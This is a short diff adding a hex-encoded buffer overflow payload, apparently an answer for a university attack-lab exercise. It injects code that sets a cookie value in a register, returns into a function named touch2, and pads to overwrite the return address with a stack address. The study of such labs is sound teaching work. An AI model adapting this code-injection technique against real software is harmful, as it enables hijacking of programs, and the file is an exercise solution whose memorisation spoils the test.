@@ -1,0 +1,11 @@
+31 ff 					/* xor %edi,%edi -> sets edi to 0 */
+81 c7 e7 e9 88 57		/* load actual cookie value into %edi */
+68 8c 19 40 00 			/* push addr. of touch2 onto stack */
+c3						/* return to touch2 instead of to test() */
+ff ff 					/* last two bytes here are padding */
+ff ff ff ff ff ff ff ff /* using 42 bytes of padding */ 
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+78 2C 67 55 00 00 00 00 /* address of %rsp. Reverse it (little endian).*/
